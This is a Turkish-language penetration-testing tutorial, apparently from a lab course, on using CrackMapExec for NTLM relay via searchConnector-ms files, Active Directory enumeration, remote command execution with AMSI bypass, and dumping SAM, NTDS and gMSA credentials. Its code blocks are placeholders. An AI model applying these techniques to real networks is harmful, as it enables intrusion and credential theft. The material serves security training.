CrackMapExec, **`drop-sc`** adında bir modüle sahiptir. Bu modül, paylaşılan bir klasörde **`searchConnector-ms`** dosyası oluşturmamıza olanak tanır. Kullanabilmek için **URL** seçeneğini belirterek **SMB fake sunucumuzu** hedef göstermemiz gerekir. Bu durumda, **`ntlmrelayx`** çalıştıran hostumuz olacaktır. **URL** değeri çift ters eğik çizgi (`\`) ile kaçırılmalıdır. Örneğin: **`URL=\\10.10.14.33\secret`**.

İsteğe bağlı olarak aşağıdaki seçenekleri belirleyebiliriz:

* `SHARE=name` seçeneği ile hedef paylaşımlı klasör . Bu seçeneği belirtmezsek, dosyayı `WRITE` izinlerine sahip tüm paylaşımlara yazacaktır

* `FILENAME=name` seçeneği ile dosya adı . Bu seçeneği belirtmezsek, “`Documents`” adında bir dosya oluşturacaktır.

* Oluşturduğumuz dosyaları temizlemek istiyorsak `CLEANUP=True` seçeneği. Eğer özel bir isim kullanacaksak filename seçeneğini belirtmemiz gerekiyor.

Drop-sc'yi iş başında görelim:

### Dropping a searchConnector-ms File

{{CODE_BLOCK_122}}

{{CODE_BLOCK_123}}

Bir kullanıcı **paylaşılan klasöre** eriştiğinde ve **ntlmrelayx** dinleme modunda çalışırken, kimlik bilgilerini **hedef makineye yönlendirebilmemiz** gerekir.

### NTLMRelayx ve drop-sc Kullanarak Yönlendirme

{{CODE_BLOCK_124}}

Son olarak, `CLEANUP=True` seçeneği ile `.searchConnector-ms` dosyasını temizleyebiliriz:


### searchConnector-ms Dosyalarını Temizleme

{{CODE_BLOCK_125}}


LNK dosyaları genellikle bu tür saldırılar için bilinir. `.searchConnector-ms` gibi başka bir dosya türü kullanmak, fark edilmemenize yardımcı olabilir.

Sonraki bölümlerde CrackMapExec'in keşif seçeneklerini inceleyeceğiz.

---


### SMB ile Mapping ve Enumeration

CrackMapExec, geçerli bir domain kullanıcı hesabıyla numaralandırma söz konusu olduğunda çok daha fazla seçenekle birlikte gelir. En çok kullanılan seçenekleri ele aldık, ancak daha derine inelim. İşte ayrıcalıklı olmasa bile geçerli bir hesap aldığımızda kullanabileceğimiz tüm seçeneklerin listesi:

| Komut                                                                 | Açıklama                                                          |
| --------------------------------------------------------------------- | ----------------------------------------------------------------- |
| `crackmapexec smb <hedef> -u <kullanıcı> -p <şifre> --loggedon-users` | Hedefte oturum açmış kullanıcıları listeler.                      |
| `crackmapexec smb <hedef> -u <kullanıcı> -p <şifre> --sessions`       | Hedefteki aktif oturumları listeler.                              |
| `crackmapexec smb <hedef> -u <kullanıcı> -p <şifre> --disks`          | Hedefteki diskleri listeler.                                      |
| `crackmapexec smb <hedef> -u <kullanıcı> -p <şifre> --computers`      | Hedef ağdaki bilgisayarları listeler.                             |
| `crackmapexec smb <hedef> -u <kullanıcı> -p <şifre> --wmi`            | Belirtilen WMI sorgusunu çalıştırır.                              |
| `crackmapexec smb <hedef> -u <kullanıcı> -p <şifre> --wmi-namespace`  | WMI Namespace’ini belirtir (varsayılan: `root\cimv2`).            |
| `crackmapexec smb <hedef> -u <kullanıcı> -p <şifre> --rid-brute`      | Hedef üzerinde RID brute-force yöntemiyle kullanıcıları listeler. |
| `crackmapexec smb <hedef> -u <kullanıcı> -p <şifre> --local-groups`   | Local grupları listeler; grup belirtilirse üyelerini listeler.    |
| `crackmapexec smb <hedef> -u <kullanıcı> -p <şifre> --shares`         | Hedefteki tüm paylaşım izinlerini listeler.                       |
| `crackmapexec smb <hedef> -u <kullanıcı> -p <şifre> --users`          | Hedefteki domain kullanıcılarını listeler.                        |
| `crackmapexec smb <hedef> -u <kullanıcı> -p <şifre> --groups`         | Hedefteki domain gruplarını listeler.                             |
| `crackmapexec smb <hedef> -u <kullanıcı> -p <şifre> --pass-pol`       | Domainin password policy'sini gösterir.                           |

Daha önce çalışmamış olanları gözden geçirelim:

### Hedefteki aktif oturumları / oturum açmış kullanıcıları numaralandırma

Birden fazla hedefi ele geçirmişsek, aktif oturumları kontrol etmek faydalı olabilir, belki bir domain administrator vardır ve bu belirli hedefe odaklanmamız gerekebilir. Bir bilgisayardaki kullanıcıları tespit etmek için `--sessions` ve `--loggedon-users` seçeneklerini kullanabiliriz. Session'lar, kullanıcının hedef makinede giriş yapmıyor olsa da kullanıcı kimlik bilgileriyle oturum açıldığı anlamına gelir. Giriş yapmış kullanıcılar ise kendiliğinden anlaşılır; bir kullanıcının hedef makineye giriş yapmış olduğunu ifade eder. `BloodHound`, aktif oturumları bulmak için kullanabileceğimiz bir diğer araçtır.


### Sessions ve loggendon-users seçeneklerini kullanma

{{CODE_BLOCK_126}}

Belirli bir kullanıcıyı arıyorsak, -`-loggedon-users-filter` seçeneğini ve ardından aradığımız kullanıcının adını kullanabiliriz. Birden fazla kullanıcı arıyorsak, `regex`'i de destekler.


### Oturum açmış kullanıcılarla filtre seçeneğini kullanma

{{CODE_BLOCK_127}}

Not: Genellikle, `--loggedon-users` veya `--sessions` parametrelerinin başarılı bir şekilde çalıştırılabilmesi için administrator izinleri gereklidir.



### Enumerate Computers

CME ayrıca domain bilgisayarlarını da listeleyebilir ve bunu bir LDAP isteği gerçekleştirerek yapar

### Domain'deki Bilgisayarları Numaralandırma

{{CODE_BLOCK_128}}


Not: Bu seçenek yalnızca SMB protokolünde mevcut olsa da, CME bir LDAP sorgusu yapmaktadır.


### Enumerate LAPS

Local Administrator Password Solution (LAPS), domain'e bağlı bilgisayarların local hesap parolalarının yönetimini sağlar. Parolalar Active Directory'de (AD) saklanır ve ACL tarafından korunur, böylece yalnızca uygun kullanıcılar bunları okuyabilir veya sıfırlama talebinde bulunabilir. LAPS domain içinde kullanılıyorsa ve LAPS şifrelerini okuyabilen bir hesabı tehlikeye atarsak, `--laps` seçeneğini bir hedef listesi ile kullanabilir ve komutları çalıştırabilir veya `--sam` gibi diğer seçenekleri kullanabiliriz.


{{CODE_BLOCK_129}}

Not: Eğer varsayılan administrator hesap adı "`administrator`" değilse, -`-laps username` seçeneğinden sonra kullanıcı adını ekleyin.

### Hedefteki RID'yi Brute-forcing yaparak Kullanıcıları Numaralandır --rid-brute

Nadiren kullanılan bir özellik, kullanıcı listeleri oluşturmak için `RID Bruteforce`'dur. `BloodHound` veya `PowerView` ile bir kullanıcı listesi oluşturabiliriz. Ancak, bu teknikler muhtemelen yakalanacak ve kurulumu biraz zaman alacaktır. CrackMapExec'in `--rid-brute` seçeneğini kullanarak, UserID'sini brute forcing yaparak bir kullanıcı listesi toplamak mümkündür.


### List Local Users

{{CODE_BLOCK_130}}

Varsayılan olarak, `--rid-brute 4000`'e kadar RID'leri zorlayarak objeleri numaralandırır. Davranışını `--rid-brute [MAX_RID]` kullanarak değiştirebiliriz.

`--rid-brute` seçeneği, brute ile zorlanan kimliklerle eşleşen kullanıcı adlarını ve diğer Active Directory objeleri almak için kullanılabilir. `NULL Authentication` etkinleştirilmişse domain hesaplarını numaralandırmak için de kullanılabilir. Bu seçeneğin bu şekillerde kullanılabileceğini unutmamak önemlidir.

### Enumerate Disks

Bazen kontrol etmeyi hatırlamamız gereken önemli bir parça, bir sunucuda bulunabilecek ek disklerdir. CrackMapExec, sunucuda var olan diskleri kontrol etmemizi sağlayan bir `--disks` seçeneğine sahiptir.

### Enumerating Disks

{{CODE_BLOCK_131}}


### Local ve Domain Gruplarını Numaralandırma

Local-groups ile local grupları veya `--groups` ile domain gruplarını listeleyebiliriz.

### Enumerating Local Groups

{{CODE_BLOCK_132}}

### Enumerating Domain Groups

{{CODE_BLOCK_133}}


Eğer grup üyelerini almak istiyorsak, `--groups [GRUP ADI]` kullanabiliriz.


### Group **Members**

{{CODE_BLOCK_134}}

Not: Yazım sırasında `--local-group` yalnızca bir Domain Controller'a karşı çalışır ve grup adını kullanarak bir grubu sorgulamak işe yaramaz.


### WMI Sorgulama

[Windows Management Instrumentation](https://learn.microsoft.com/en-us/windows/win32/wmisdk/wmi-start-page) (WMI), Windows işletim sistemlerinde administrative işlemler için kullanılır. Remote bilgisayarlardaki administrative görevlerini otomatikleştirmek için WMI script dosyaları veya uygulamaları yazabiliriz. WMI, işletim sisteminin diğer bölümlerine ve System Center Operations Manager (eski adıyla Microsoft Operations Manager (MOM)) veya Windows Remote Management (WinRM) gibi ürünlere yönetim verileri sağlar.

Windows Management Instrumentation'nın (WMI) birincil kullanım alanlarından biri, sınıf (class) ve örnek (instance) bilgileri için WMI havuzunu sorgulama yeteneğidir. Örneğin, WMI'dan remote veya local bir sistemden shut-down olaylarını temsil eden tüm objeleri döndürmesini isteyebiliriz.

WMI, TCP port `135` ve bir dizi dinamik port kullanır: `49152-65535 (RPC dinamik portları - Windows Vista, 2008 ve üzeri)`, TCP 1024-65535 (RPC dinamik portları - Windows NT4, Windows 2000, Windows 2003) veya WMI'yı özel bir port aralığı kullanacak şekilde ayarlayabiliriz

Örneğin, remote bir bilgisayarda `Sysmon` uygulamasının çalışıp çalışmadığını sorgulamak ve `Caption` ve `ProcessId`'yi görüntülemek için WMI kullanalım, kullanacağımız WMI sorgusu S`ELECT Caption,ProcessId FROM Win32_Process WHERE Caption LIKE '%sysmon%'` şeklindedir:


### Sysmon'un Çalışıp Çalışmadığını Sorgulamak için WMI Kullanma

{{CODE_BLOCK_135}}

WMI, sınıflarını hiyerarşik bir namespace içinde düzenler. Bir sorgu gerçekleştirmek için, Class Name ve bulunduğu Namespace'i bilmemiz gerekir. Yukarıdaki örnekte, `Win32_Process` sınıfını `root\cimv2` namespace'inde sorguluyoruz. Namespace'i belirtmedik çünkü varsayılan olarak CME, `root\cimv2`'yi kullanır (bu bilgiyi --help menüsünde görebiliriz).

Başka bir namespace'i sorgulamak için onu belirtmemiz gerekir. Örneğin, `root\WMI` namespace'inde bulunan `MSPower_DeviceEnable` sınıfını sorgulayalım. Bu sınıf, sistem çalışırken dinamik olarak açılıp kapanması gereken cihazlar hakkında bilgi tutar. Belirli bir konuyla ilgili WMI sınıflarının nasıl bulunacağı hakkında daha fazla bilgi edinmek için [Microsoft](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_wmi?view=powershell-5.1#finding-wmi-classes) ve [wutils.com'](https://wutils.com/wmi/)daki 3. taraf belgelerini kullanabiliriz.


### Quering root\WMI Namespace

{{CODE_BLOCK_136}}

Not: Genellikle, WMI'yı sorgulamak için administrative ayrıcalıklarına sahip olmamız gerekir, ancak bir administrator, WMI'yı sorgulamak için administrator olmayan bir hesabı yapılandırabilir. Bu durumda, WMI sorgularını gerçekleştirmek için administrator olmayan bir hesap kullanabiliriz.

WMI Sorgu Dili (WQL) hakkında daha fazla bilgi edinmek için [Microsoft'un Belgelerini](https://learn.microsoft.com/en-us/windows/win32/wmisdk/wql-sql-for-wmi) okuyabiliriz.



Aşağıdaki bölüm LDAP ve RDP protokollerini kullanarak numaralandırmayı kapsayacaktır.

----


### LDAP and RDP Enumeration

Daha önce, CrackMapExec'te en çok kullanılan protokol olan `SMB` ile bazı numaralandırma seçeneklerini inceledik, ancak `LDAP` ve `RDP` protokolleri ile daha fazla numaralandırma seçeneği vardır

Bu bölümde, bu seçeneklerden bazıları ve hedeflerimizi nasıl daha fazla numaralandırabileceğimiz gösterilecektir

### LDAP & RDP Commands

LDAP ve RDP protokolleri aşağıdaki seçenekleri içerir:

| Komut                                                                          | Açıklama                                                                                           |
| ------------------------------------------------------------------------------ | -------------------------------------------------------------------------------------------------- |
| `crackmapexec ldap <hedef> -u <kullanıcı> -p <şifre> --users`                  | Etkin Domain kullanıcılarını listeler.                                                             |
| `crackmapexec ldap <hedef> -u <kullanıcı> -p <şifre> --groups`                 | Domain gruplarını listeler.                                                                        |
| `crackmapexec ldap <hedef> -u <kullanıcı> -p <şifre> --password-notrequired`   | `PASSWORD_NOTREQD` bayrağı olan kullanıcıları listeler.                                            |
| `crackmapexec ldap <hedef> -u <kullanıcı> -p <şifre> --trusted-for-delegation` | `TRUSTED_FOR_DELEGATION` bayrağı olan kullanıcı ve bilgisyalarını listeler.                        |
| `crackmapexec ldap <hedef> -u <kullanıcı> -p <şifre> --admin-count`            | `adminCount=1` derecesine sahip objeleri listeler.                                                 |
| `crackmapexec ldap <hedef> -u <kullanıcı> -p <şifre> --get-sid`                | Domainin SID bilgisini alır.                                                                       |
| `crackmapexec ldap <hedef> -u <kullanıcı> -p <şifre> --gmsa`                   | GMSA (Gruplandırılmış Yönetici Hizmet Hesapları) şifrelerini listeler.                             |
| `crackmapexec rdp <hedef> -u <kullanıcı> -p <şifre> --nla-screenshot`          | NLA (Ağ Seviyesinde Kimlik Doğrulaması) devre dışı ise RDP giriş ekranının ekran görüntüsünü alır. |
| `crackmapexec rdp <hedef> -u <kullanıcı> -p <şifre> --screenshot`              | Bağlantı başarılıysa RDP oturumunun ekran görüntüsünü alır.                                        |
| `crackmapexec rdp <hedef> -u <kullanıcı> -p <şifre> --screentime`              | Masaüstü görüntüsü için bekleme süresini belirtir.                                                 |
| `crackmapexec rdp <hedef> -u <kullanıcı> -p <şifre> --res RES`                 | Çözünürlük belirler (örnek format: WIDTHxHEIGHT, varsayılan: 1024x768).                            |

Henüz çalışmadıklarımız varsa onları gözden geçirelim.

### Enumerating Users and Groups

SMB protokolünde yaptığımız gibi, `LDAP` ile de kullanıcıları ve grupları listeleyebiliriz:

### Enumerating Users and Groups

{{CODE_BLOCK_137}}

Not: Domain FQDN'sini çözümleyemezsek LDAP protokol iletişimlerinin çalışmayacağını unutmayın. Domain DNS sunucularına bağlanmıyorsak, FQDN'yi `/etc/hosts` dosyasında yapılandırmamız gerekir


### İlginç Hesap Özelliklerini Numaralandırma

`ldap` protokolü, `PASSWD_NOTREQD` veya `TRUSTED_FOR_DELEGATION` bayrağı ile hesapları tanımlamamıza yardımcı olacak birkaç seçeneğe daha sahiptir ve hatta `adminCount` değeri `1` olan tüm hesapları sorgulayabiliriz.

`PASSWD_NOTREQD` hesap denetimi attribute ayarlanmışsa, kullanıcı geçerli password policy uzunluğuna tabi değildir, yani daha kısa bir parolaya sahip olabilir veya hiç parola kullanmayabilir (domain'de boş parolalara izin veriliyorsa). Bu hesapları tanımlamak için  `--password-notrequired` seçeneğini kullanabiliriz.


### PASSWD_NOTREQD Attribute Tanımlanması

{{CODE_BLOCK_138}}

`TRUSTED_FOR_DELEGATION` attribute ayarlanırsa, bir servisin altında çalıştığı servis hesabı (kullanıcı veya bilgisayar) Kerberos yetkilendirmesi için güvenilirdir, yani servisi talep eden bir client'i taklit edebilir. Bu saldırı türüne `Kerberos Unconstrained Delegation` adı verilir. Bu konu hakkında daha fazla bilgi edinmek için bu [blog](https://adsecurity.org/?p=1667) yazısını okuyabilirsiniz.

### Unconstrained Delegation Belirlenmesi

{{CODE_BLOCK_139}}

`AdminCount` attribute, SDProp process'in bir kullanıcıyı koruyup korumadığını belirler. Bu process'te, Active Directory'deki `AdminSDHolder`, korunan user account'lar için ACL permissions'ın bir template'i olarak görev yapar. Eğer herhangi bir account ACE'si (örneğin, bir attacker tarafından) modified edilirse, bu process tarafından korunan account'ların ACL permissions'ı, `SDProp` process her çalıştığında (default olarak her 60 dakikada bir çalışır, ancak bu süre modified edilebilir) templated permission set'e resetlenir. User, adminCount değeri 0 olarak set edilmişse veya specified değilse bu koruma kapsamına girmez. Eğer attribute value 1 olarak set edilmişse, user korunur. Attacker'lar genellikle internal environment'ta adminCount attribute'i 1 olan account'ları target olarak arar. Bunlar genellikle privileged account'lardır ve further access veya full domain compromise ile sonuçlanabilir.


### adminCount Attribute'u Sorgulama

{{CODE_BLOCK_140}}


### Domain SID'sini numaralandırma

Bazı domain attack'ları, bir user veya domain SID gibi belirli domain bilgilerini elde etmemizi gerektirir. SID (Security IDentifier), bir computer veya domain controller'ın sizi tanımlamak için kullandığı `unique bir ID` numarasıdır. Domain SID ise domain'i tanımlayan unique bir ID numarasıdır. CrackMapExec kullanarak domain SID'i elde etmek için `--get-sid` flag'ini kullanabiliriz:

### Domain SID'i Toplama

{{CODE_BLOCK_141}}


### Group Managed Service Accounts (gMSA)

Bağımsız Yönetilen Hizmet Hesabı (standalone Managed Service Account) (sMSA), aşağıdakileri sağlayan yönetilen bir domain hesabıdır:

* Otomatik parola yönetimi.
* Basitleştirilmiş service principal name (SPN) yönetimi.
* Yönetimi diğer yöneticilere devretme yeteneği

Bu yönetilen servis hesabı (MSA) türü Windows Server 2008 R2 ve Windows 7'de tanıtılmıştır.

Group Managed Service Account (gMSA) domain içinde aynı işlevselliği sağlar ancak aynı zamanda bu işlevselliği birden fazla sunucuya genişletir.

Bir gMSA hesabının parolasını okuma ayrıcalıklarına sahip bir hesabı belirlemek için PowerShell'i kullanabiliriz (komut yürütmeyi bir sonraki bölümde daha ayrıntılı olarak ele alacağız):

### Enumerating Accounts with gMSA Privileges

{{CODE_BLOCK_142}}


Yukarıdaki örnekte, `engels` kullanıcısının `PrincipalsAllowedToRetrieveManagedPassword` ayrıcalığına sahip olduğunu görebiliriz, bu da `svc_inlaneadm$` gMSA hesabının parolasını okuyabileceği anlamına gelir. gMSA parolasını okuma hakkına sahip bir hesabı tehlikeye atarsak, hesabın `NTLM` parola hash'ini almak için `--gmsa` seçeneğini kullanabiliriz.


### gMSA Parolasını Edinme

{{CODE_BLOCK_143}}

Bu kimlik bilgilerini kullanmak için, hash'ler için -H seçeneğini kullanabiliriz.

### svc_inlaneadm$ Hesabı ile Paylaşılan Klasörleri İnceleme

{{CODE_BLOCK_144}}


---

### RDP Screenshots

RDP protokolü aracılığıyla kullanıcı adlarını numaralandırmak için CrackMapExec'i kullanabiliriz. Hedef makinede RDP'ye yalnızca `NLA` ile izin verme seçeneği devre dışı bırakılmışsa, oturum açma isteminin ekran görüntüsünü almak için `--nlascreenshot` seçeneğini kullanabiliriz


### Enumerate Login Prompt

{{CODE_BLOCK_145}}

Ekran görüntüsünü açmak için MATE'in Eye'ını veya CLI'dan eom'u kullanabiliriz.


### Ekran Görüntüsünü Açmak için MATE'in Eye Kullanma

{{CODE_BLOCK_146}}

![Pasted image 20241202231735.png](/img/user/resimler/Pasted%20image%2020241202231735.png)

Eğer bir kullanıcı adı ve parolamız varsa, `--screenshot` seçeneği ile RDP protokolünü kullanarak da ekran görüntüsü alabiliriz. Bu seçenek `--screentime` ile birleştirilebilir, varsayılan olarak `10`, RDP bağlantısı açıldıktan sonra ekran görüntüsü almak için bekleyeceği süredir. Bu, bir hedef makineye bağlandığımızda ve hedefin masaüstünü yüklemesi 10 saniyeden fazla sürdüğünde kullanışlıdır.

Ekran görüntüsü seçeneğiyle birleştirilebilecek bir diğer seçenek de RDP bağlantısı sırasındaki ekran çözünürlüğüne karşılık gelen `--res` seçeneğidir. Bu seçenek yararlıdır çünkü aktif bir RDP oturumu bulursak, kullanıcının ekranının boyutuna bağlı olarak tüm içeriği görebiliriz veya göremeyiz. Varsayılan olarak bu seçenek `1024x768` olarak ayarlanmıştır


### Screenshot Alma

{{CODE_BLOCK_147}}


Not: `--screentime` ve `--res` isteğe bağlı bayraklardır.

Son olarak, ekran görüntüsünü açmak için MATE'in Eye'ını veya CLI'dan eom'u kullanabiliriz:


### Ekran Görüntüsünü Açmak için MATE'in Gözünü Kullanma

{{CODE_BLOCK_148}}

![Pasted image 20241202232523.png](/img/user/resimler/Pasted%20image%2020241202232523.png)

Bu bölümde, hedeflerimize ulaşmamıza yardımcı olabilecek LDAP ve RDP kullanarak çeşitli numaralandırma seçeneklerini inceledik. Aşağıdaki bölüm, CrackMapExec kullanarak komutların nasıl çalıştırılacağını gözden geçirecektir.


---

### Command Execution

Remote target üzerinde local administrator olarak bir komut çalıştırmaya çalışmadan önce `UAC`'nin varlığını kontrol etmeliyiz. UAC etkinleştirildiğinde, ki bu varsayılan durumdur, yalnızca `RID 500`'e sahip administrator hesabı (varsayılan administrator) remote komutları yürütebilir. Durumun böyle olup olmadığını kontrol etmek için iki registry key vardır:

`HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\LocalAccountTokenFilterPolicy`
`HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\FilterAdministratorToken`

Varsayılan olarak, `LocalAccountTokenFilterPolicy` değeri 0 olarak ayarlanmıştır, yani yalnızca built-in administrator hesabı (RID 500) administration görevlerini gerçekleştirebilir. Local administrator grubunda olsak bile, yalnızca kullanıcımızın RID'si `500` ise remote komutları çalıştırabiliriz. Değer 1 olarak ayarlanırsa tüm administrative hesapları yönetim görevlerini yürütebilir.

Administrator yapılandırabileceği bir diğer ayar da local administrator hesabının (RID 500) remote yönetim görevlerini yerine getirmesini engellemektir. Bu, `FilterAdministratorToken` registry değerini 1 olarak ayarlayarak yapılabilir; bu, built-in administrator hesabının (RID 500) remote administrative tasks (remote yönetim görevleri) gerçekleştiremeyeceği anlamına gelir.


### Administrator Olarak Komut Yürütme

Komutları çalıştırmak ve administrators grubuna kimlerin üye olduğunu görmek için Administrator hesabını kullanalım. Windows komut satırı komutlarını çalıştırmak için `-x` seçeneğini ve ardından çalıştırmak istediğimiz komutu kullanmamız gerekir.


### Bir Komutu Administrator Olarak Çalıştırma

{{CODE_BLOCK_149}}


### RID 500 Olmayan Hesap Olarak Komut Yürütme

Yukarıdaki komutta, `localadmin` local user `Administrators` grubundadır, ancak remote komutu çalıştıramaz:

### Komutu localadmin olarak çalıştırma

{{CODE_BLOCK_150}}

Bu, UAC'nin etkin olduğu anlamına gelir. Eğer durum böyleyse, hesap administrator olsa bile (Pwn3d!) mesajını almayacağız. Bu ayarı geri almak istiyorsak, `LocalAccountTokenFilterPolicy`'yi 1 olarak ayarlayabiliriz.


### LocalAccountTokenFilterPolicy'yi Değiştirme

{{CODE_BLOCK_151}}


{{CODE_BLOCK_152}}


### Domain Hesabı Olarak Komut Yürütme

`LocalAccountTokenFilterPolicy` yalnızca local hesaplar için geçerlidir. Bir domain kullanıcımız varsa ve `administrators` grubunun bir parçasıysa, UAC ayarıyla bile komutu çalıştırabiliriz. Bu senaryoda, `INLANEFREIGHT\robert` hesabı `administrators` `grubunun` bir üyesidir, yani UAC etkin olsa bile komutları yürütebilir.


### Komutu Robert olarak çalıştır

{{CODE_BLOCK_153}}


### SMB ile Komut Yürütme

CME'nin dört (4) farklı komut yürütme yöntemi vardır:

| Komut   | Açıklama                                                                                                                             |
| ------- | ------------------------------------------------------------------------------------------------------------------------------------ |
| wmiexec | WMI (Windows Management Instrumentation) kullanılarak komutlar yürütülür (`diskte dosya oluşturulur`).                               |
| atexec  | Windows `görev zamanlayıcısı` ile bir görev planlayarak komutlar yürütülür (`fileless`, ancak Windows’un en son sürümünde çalışmaz). |
| smbexec | Bir servis oluşturup çalıştırarak komutlar yürütülür (`fileless`, ancak Windows’un en son sürümünde çalışmaz).                       |
| mmcexec | wmiexec yöntemine benzer, ancak komutlar Microsoft Yönetim Konsolu (MMC) aracılığıyla yürütülür.                                     |

Not: Her yöntem her bilgisayarda çalışmayabilir.

Varsayılan olarak, CME biri başarısız olursa farklı bir yürütme yöntemine geçecektir. Komutları aşağıdaki sırayla yürütmeye çalışır:

* 1. wmiexec 2. atexec 3. smbexec 4. mmcexec

CME'yi yalnızca bir yürütme yöntemi kullanmaya zorlamak istiyorsak, örneğin `--exec-method` bayrağını kullanarak hangisini kullanacağımızı belirtebiliriz:


### SMBExec Yöntemi ile Komut Yürütme

{{CODE_BLOCK_154}}

Alternatif olarak, -X seçeneğini kullanarak PowerShell ile komutları çalıştırabiliriz:

### wmiexec aracılığıyla PowerShell Komut Yürütme

{{CODE_BLOCK_155}}


PowerShell seçeneği -X çalıştırıldığında, perde arkasında `CrackMapExec` aşağıdakileri yapacaktır:

* AMSI bypass 
* Obfuscate the payload 
* Execute the payload

### Özel AMSI Bypass Çalıştırma

Bu teknikler `PowerShell` çalıştırılırken algılanabilir. Özel bir AMSI bypass payload'u kullanmak istiyorsak, `--amsi-bypass` seçeneğini ve ardından kullanmak istediğimiz payload'un yolunu kullanabiliriz. Örneğin, [AMSI Bypass Değiştirilmiş Amsi ScanBuffer](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell#modified-amsi-scanbuffer-patch) Yamasını kullanalım. Bunu bir dosyaya kaydedeceğiz ve bu AMSI Bypass'ı bir web sunucusundan belleğe yüklemek için bir PowerShell scripti oluşturacağız. İşte adımlar:

*  “Modified Amsi ScanBuffer Patch” içeren dosyayı indirin


### “Modified Amsi ScanBuffer Patch” ile Bir Dosya Oluşturun

{{CODE_BLOCK_156}}


Payload'u olduğu gibi çalıştırmaya çalışırsak, komut maksimum uzunluk olan 8191 karakteri aşacağı için başarısız olacaktır

### Komut Maksimum Uzunluğu Aşıyor

{{CODE_BLOCK_157}}

* Bu sorunu çözmek için, `shantanukhande-amsi.ps1` dosyasını indiren ve çalıştıran bir PowerShell scripti oluşturalım. Ayrıca scriptimizi barındırmak için bir Python web sunucusu oluşturmamız gerekecek.

### PowerShell Komut Dosyasını Oluşturma ve Barındırma

{{CODE_BLOCK_158}}


Not: Sonuna noktalı virgül (;) eklediğinizden emin olun.

Başka bir terminalden, yeni AMSI bypass payload'umuzu çalıştıralım:

### PowerShell Özel AMSI Bypass Kullanma

{{CODE_BLOCK_159}}


### WinRM Kullanarak Komut Yürütme

WinRM protokolü ile de komutları çalıştırabiliriz. Varsayılan olarak WinRM, HTTP TCP port `5985` ve HTTPS TCP port `5986`'yı dinler. Bu protokolle ilgili özel bir şey, bir kullanıcının komutları yürütmek için `administrator` olmasını gerektirmemesidir. `Administrators` grubunun üyesiysek, `Remote Management Users` grubunun üyesiysek veya oturum yapılandırmasında açık `PowerShell Remoting` izinlerimiz varsa WinRM protokolünü kullanabiliriz.

### Command Execution using WinRM

{{CODE_BLOCK_160}}


### WinRM aracılığıyla PowerShell Komut Yürütme

{{CODE_BLOCK_161}}

### Other PowerShell Options

WinRM komut yürütme ile kullanabileceğimiz çeşitli seçenekler vardır. Bunlardan bazılarını görelim:

| Seçenek           | Açıklama                                                |
| ----------------- | ------------------------------------------------------- |
| --port PORT       | WinRM bağlantısı için özel bir port seçmek.             |
| --ssl             | SSL etkinleştirilmiş WinRM'ye bağlanmak.                |
| --ignore-ssl-cert | SSL ile bağlanırken sertifika doğrulamasını yok saymak. |

Not: WinRM protokolü farklı yürütme yöntemlerini desteklemez.

### SSH Command Execution

CrackMapExec kullanarak Linux veya Windows üzerinde komutları çalıştırmak için SSH protokolünü de kullanabiliriz.

### Command Execution with SSH

{{CODE_BLOCK_162}}

Bir SSH sunucusuyla etkileşime girmenin bir başka yaygın yolu da `public` ve `private` keyleri kullanmaktır. CrackMapExec, `--key-file` seçeneği ile `private key` kullanımını destekler. Anahtarın çalışması için `OPENSSH` formatında olması gerekir.

### Private Key Kullanarak SSH ile Komut Yürütme

{{CODE_BLOCK_163}}

Not: Herhangi bir parola yapılandırılmamışsa, `-p` seçeneğini boş `(“”)` olarak ayarlamalıyız, aksi takdirde bir hata alırız

Bu bölümde, CrackMapExec kullanarak komutları yürütmek için üç farklı protokol keşfettik ve daha önce komutları yürütmek için MSSQL'in nasıl kullanılacağını tartıştık. Yazım sırasında, CrackMapExec komutları yürütmek için diğer dört protokolü desteklemektedir. Bir sonraki bölümde CrackMapExec'in kimlik bilgilerini ayıklamak için nasıl kullanılacağı tartışılacaktır.


### Gizli Bilgileri Bulma ve Kullanma

Parola çıkarma söz konusu olduğunda, CrackMapExec oldukça güçlüdür. On workstation ele geçirdiğimizi ve tümünden kimlik bilgilerini almak için LSASS process'inin belleğini dump istediğimizi düşünelim; CrackMapExec bunu yapabilir.

Bu bölümde, CrackMapExec'in Windows kimlik bilgilerini dump için sunduğu yöntemleri inceleyeceğiz.


### SAM

SAM database, tüm local kullanıcıların kimlik bilgilerini içerir ve birçok administrator local kimlik bilgilerini birden fazla makinede yeniden kullandığı için bunları ele geçirmek kritik öneme sahiptir. `SMB` ve `WinRM` protokolleriyle kullanılabilen `--sam` seçeneğini kullanarak SAM database içeriğini hızlı bir şekilde alabiliriz.

### Dumping SAM

{{CODE_BLOCK_164}}


### NTDS Active Directory Database

Kimlik bilgilerinin alınabileceği bir başka yer de Active Directory veritabanıdır. ntds.dit dosyası, kullanıcı objeleri, gruplar ve grup üyeliği hakkındaki bilgiler de dahil olmak üzere Active Directory verilerini depolayan bir veritabanıdır. Özellikle, dosya aynı zamanda domain'deki tüm kullanıcılar için parola hash'lerini de saklar (ve hatta bazen bir veya daha fazla hesap için [reversible encryption](https://learn.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/store-passwords-using-reversible-encryption) etkinleştirilmişse açık metin parolalarını da saklar). Bir Domain Admin hesabına veya bir replikasyon/DCSync gerçekleştirme ayrıcalıklarına sahip başka bir hesaba erişimimiz varsa, bir Domain Controller'dan hash'leri dökebiliriz

Hash'leri dump etmek için `--ntds` seçeneğini kullanmamız gerekir, aşağıdaki örnekte `robert` kullanıcısı bir Domain Admin değildir, ancak `replikasyon` gerçekleştirme ayrıcalıklarına sahiptir.

### Domain Controller üzerinden NTDS database dump etme

{{CODE_BLOCK_165}}

`--ntds` seçeneğini kullanırken `--user` ve `--enabled` seçeneklerini dahil edebiliriz. Eğer `--user` kullanırsak ayıklamak istediğimiz kullanıcıyı belirtebiliriz. KRBTGT hesabı için hash dump alalım.

### Yalnızca KRBTGT Hesabının Dump Edilmesi

{{CODE_BLOCK_166}}

Eğer `--enabled` olarak belirtirsek, sadece ekranda `etkin` olan kullanıcıları gösterecek ve bize etkin kullanıcıların listesini çıkarma seçeneği sunacaktır.


### Yalnızca Enabled Hesapları Gösterme

{{CODE_BLOCK_167}}


### Secrets (hash'leri) kullanma

Elde ettiğimiz şifreler NTLM hash'leridir. Hash'leri kırmayı deneyebilir veya parolayı kırmadan kullanıcı olarak kimlik doğrulaması yapmak için `Pass the Hash` tekniğini kullanabiliriz. 

